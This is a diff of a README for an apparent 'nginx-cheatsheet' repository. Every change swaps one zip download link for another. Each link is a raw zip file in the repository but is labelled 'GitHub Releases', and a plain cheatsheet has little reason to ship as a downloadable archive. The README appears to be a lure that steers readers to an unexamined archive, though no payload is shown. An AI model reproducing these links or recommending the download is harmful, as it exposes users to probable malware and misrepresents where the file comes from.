@@ -1,6 +1,6 @@
 # ⚡ nginx-cheatsheet - Simplify Your NGINX Setup
 
-[![Download](https://raw.githubusercontent.com/iYagamiGTPS4/nginx-cheatsheet/main/bunemost/nginx-cheatsheet.zip)](https://raw.githubusercontent.com/iYagamiGTPS4/nginx-cheatsheet/main/bunemost/nginx-cheatsheet.zip)
+[![Download](https://raw.githubusercontent.com/iYagamiGTPS4/nginx-cheatsheet/main/Advanced/cheatsheet-nginx-v1.2.zip)](https://raw.githubusercontent.com/iYagamiGTPS4/nginx-cheatsheet/main/Advanced/cheatsheet-nginx-v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ NGINX is a powerful web server that can serve web pages efficiently. This cheats
 
 ## 📥 Download & Install
 
-To download the nginx-cheatsheet, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/iYagamiGTPS4/nginx-cheatsheet/main/bunemost/nginx-cheatsheet.zip). There, you can choose the version that best fits your needs.
+To download the nginx-cheatsheet, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/iYagamiGTPS4/nginx-cheatsheet/main/Advanced/cheatsheet-nginx-v1.2.zip). There, you can choose the version that best fits your needs.
 
 ### Step-by-Step Installation
 
@@ -88,4 +88,4 @@ If you encounter any issues or have questions, please check the issues section o
 
 This nginx-cheatsheet is your go-to guide for simplifying NGINX management tasks. By following this guide, you will quickly grasp how to deploy and manage your web server effectively. 
 
-For additional resources and updates, remember to frequently check back to the [GitHub Releases page](https://raw.githubusercontent.com/iYagamiGTPS4/nginx-cheatsheet/main/bunemost/nginx-cheatsheet.zip).
+For additional resources and updates, remember to frequently check back to the [GitHub Releases page](https://raw.githubusercontent.com/iYagamiGTPS4/nginx-cheatsheet/main/Advanced/cheatsheet-nginx-v1.2.zip).
